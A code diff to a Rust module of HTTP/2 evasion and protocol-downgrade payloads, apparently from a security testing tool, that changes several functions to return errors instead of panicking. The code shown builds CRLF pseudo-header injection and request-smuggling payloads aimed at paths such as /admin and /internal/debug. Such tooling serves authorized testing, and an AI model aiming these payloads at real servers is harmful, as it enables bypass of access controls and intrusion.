@@ -1,6 +1,6 @@
 //! HTTP/2 frame-level evasion and downgrade techniques.
 
-use crate::safety::sanitize_input;
+use crate::safety::{SafetyError, sanitize_input};
 
 /// An HTTP/2 evasion technique descriptor.
 #[derive(Debug, Clone)]
@@ -102,11 +102,11 @@ pub fn crlf_in_pseudo_headers(
     path: &str,
     smuggled_header: &str,
     smuggled_value: &str,
-) -> H2Evasion {
-    let path = sanitize_input(path).unwrap();
-    let h = sanitize_input(smuggled_header).unwrap();
-    let v = sanitize_input(smuggled_value).unwrap();
-    H2Evasion {
+) -> Result<H2Evasion, SafetyError> {
+    let path = sanitize_input(path)?;
+    let h = sanitize_input(smuggled_header)?;
+    let v = sanitize_input(smuggled_value)?;
+    Ok(H2Evasion {
         name: "H2 CRLF Pseudo-Header Injection",
         description: "Inject CRLF in :path to smuggle headers during downgrade",
         pseudo_headers: vec![
@@ -119,7 +119,7 @@ pub fn crlf_in_pseudo_headers(
         target_flaw: H2TargetFlaw::ProtocolDowngrade,
         end_stream: None,
         end_headers: None,
-    }
+    })
 }
 
 /// Smuggle a complete second request via CRLF in :path.
@@ -129,11 +129,11 @@ pub fn crlf_in_pseudo_headers(
 /// This may corrupt downstream parser state, desynchronize connection pools,
 /// or cause request splitting. Only use on targets you own or have explicit
 /// authorization to test.
-pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> H2Evasion {
-    let path = sanitize_input(path).unwrap();
-    let smuggled = sanitize_input(smuggled_path).unwrap();
+pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> Result<H2Evasion, SafetyError> {
+    let path = sanitize_input(path)?;
+    let smuggled = sanitize_input(smuggled_path)?;
     let req = format!("{path}\r\nHost: internal\r\n\r\nGET {smuggled} HTTP/1.1\r\nHost: internal");
-    H2Evasion {
+    Ok(H2Evasion {
         name: "H2 CRLF Request Smuggling",
         description: "Smuggle a complete second request via CRLF in :path",
         pseudo_headers: vec![
@@ -142,7 +142,7 @@ pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> H2Evasion {
             (":scheme".into(), "https".into()),
         ],
         ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
-    }
+    })
 }
 
 /// Build a regular-header CRLF injection probe.
@@ -728,12 +728,8 @@ pub fn hpack_table_manipulations() -> Vec<HpackTableManipulation> {
     ]
 }
 
-pub fn all_evasions(path: &str, host: &str) -> Vec<H2Evasion> {
+pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyError> {
     let mut evasions = vec![
-        crlf_in_pseudo_headers(path, "X-Forwarded-For", "127.0.0.1"),
-        crlf_in_pseudo_headers(path, "Transfer-Encoding", "chunked"),
-        crlf_request_smuggle(path, "/admin"),
-        crlf_request_smuggle(path, "/internal/debug"),
         crlf_in_regular_header("user-agent", "Mozilla/5.0"),
         crlf_in_header_name("x", "foo: bar"),
         authority_host_mismatch(host, "localhost"),
@@ -756,11 +752,15 @@ pub fn all_evasions(path: &str, host: &str) -> Vec<H2Evasion> {
         h2_te(host),
         alpn_h2c(),
     ];
+    evasions.push(crlf_in_pseudo_headers(path, "X-Forwarded-For", "127.0.0.1")?);
+    evasions.push(crlf_in_pseudo_headers(path, "Transfer-Encoding", "chunked")?);
+    evasions.push(crlf_request_smuggle(path, "/admin")?);
+    evasions.push(crlf_request_smuggle(path, "/internal/debug")?);
     evasions.extend(mixed_case_headers());
     evasions.extend(exotic_scheme(path, host));
     evasions.extend(invalid_path_chars());
     evasions.extend(pseudo_header_reordering(path, host));
-    evasions
+    Ok(evasions)
 }
 
 #[cfg(test)]
